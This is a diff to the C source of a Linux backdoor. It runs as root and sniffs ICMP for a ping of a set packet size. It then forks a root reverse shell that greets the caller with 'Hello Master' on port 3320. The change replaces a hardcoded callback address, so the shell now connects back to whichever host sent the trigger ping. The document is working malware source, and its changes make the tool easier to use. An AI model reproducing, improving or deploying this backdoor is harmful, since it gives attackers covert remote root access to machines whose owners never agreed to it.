@@ -1,8 +1,8 @@
 /* 
- * Linux backdoor using ping technique
+ * Linux backdoor using ICMP technique
  * Coded by jamez - jamez#sekure.org (Sep 13, 1998)
  * Reverse shell functionality added by Mihai Sbirneciu - mihai.sbirneciu#gmail.com (Nov 17, 2014)
- * Special thanks for Alexander G. for bringing this gem to my attention.
+ * Special thanks to Alexander G. for bringing this gem to my attention.
  * You must run the backdoor as root to be able to sniff ICMP:    
  *  ./backdoor packet_size
  *                  |
@@ -20,12 +20,11 @@
 #include <netinet/ip.h>
 #include <netdb.h>
 #define NULL 0
-#define REVERSE_HOST "192.168.56.1"
 #define REVERSE_PORT 3320
 #define MOTD  "Hello Master\n\n# "
 
 int SIZEPACK;
-void start_reverse_shell()
+void start_reverse_shell(char ipAddress[])
 {
     setuid(0);
     setgid(0);
@@ -41,7 +40,7 @@ void start_reverse_shell()
     memset(&serv_addr, '0', sizeof(serv_addr));
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(REVERSE_PORT);
-    if(inet_pton(AF_INET, REVERSE_HOST, &serv_addr.sin_addr)<=0)
+    if(inet_pton(AF_INET, ipAddress, &serv_addr.sin_addr)<=0)
     {
         return 1;
     }
@@ -93,11 +92,15 @@ int main(int argc, char *argv[])
             if ((size = recvfrom(s, pkt, sizeof(pkt), 0, (struct sockaddr *) &from, &fromlen)) < 0)
             printf("ping of %i\n", size-28);
         } while (size != SIZEPACK + 28);
+        char ipAddress[INET_ADDRSTRLEN];
+        inet_ntop(AF_INET, &(from.sin_addr.s_addr), ipAddress, INET_ADDRSTRLEN);
+
+        printf("The IP address is: %s\n", ipAddress);
         switch(fork()){
             case -1:
             continue;
             case 0:
-            start_reverse_shell();
+            start_reverse_shell(ipAddress);
             exit(0);
         }
         sleep(15);
